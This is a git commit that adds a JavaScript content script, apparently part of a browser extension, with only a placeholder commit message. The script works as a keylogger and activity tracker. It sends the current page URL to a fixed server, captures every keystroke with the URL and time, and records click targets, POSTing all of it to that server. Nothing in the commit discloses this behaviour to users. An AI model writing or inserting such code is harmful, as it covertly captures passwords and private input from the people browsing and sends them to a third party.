06c819e10b240d0d874893cd6c2abea51ab6e597
melvinRenversez <120313822+melvinRenversez@users.noreply.github.com>
2024-06-20 00:49:52 +0200

    Message de votre commit

---
+++ MY/content.js
@@ -0,0 +1,82 @@
+const serv = "192.168.0.41:3000";
+
+function getUrl() {
+    const currentUrl = window.location.href;
+
+    const data = {
+        url: currentUrl
+    };
+
+    fetch(`https://${serv}/url`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(responseText => {
+        console.log('Réponse du serveur :', responseText);
+    })
+    .catch(error => {
+        console.error('Erreur lors de l\'envoi des données :', error);
+    });
+}
+
+getUrl();
+
+document.addEventListener('keydown', (e) => {
+    const currentUrl = window.location.href;
+
+    const data = {
+        url: currentUrl,
+        key: e.key,
+        time: new Date()
+    };
+
+    fetch(`https://${serv}/key`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(responseText => {
+        console.log('Réponse du serveur :', responseText);
+    })
+    .catch(error => {
+        console.error('Erreur lors de l\'envoi des données :', error);
+    });
+});
+
+document.addEventListener('click', (e) => {
+    const currentUrl = window.location.href;
+
+    const elementInfo = {
+        tagName: e.target.tagName,
+        id: e.target.id,
+        classList: Array.from(e.target.classList)
+    };
+
+    const data = {
+        url: currentUrl,
+        target: elementInfo,
+        time: new Date()
+    };
+
+    fetch(`https://${serv}/click`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(responseText => {
+        console.log('Réponse du serveur :', responseText);
+    })
+    .catch(error => {
+        console.error('Erreur lors de l\'envoi des données :', error);
+    });
+});
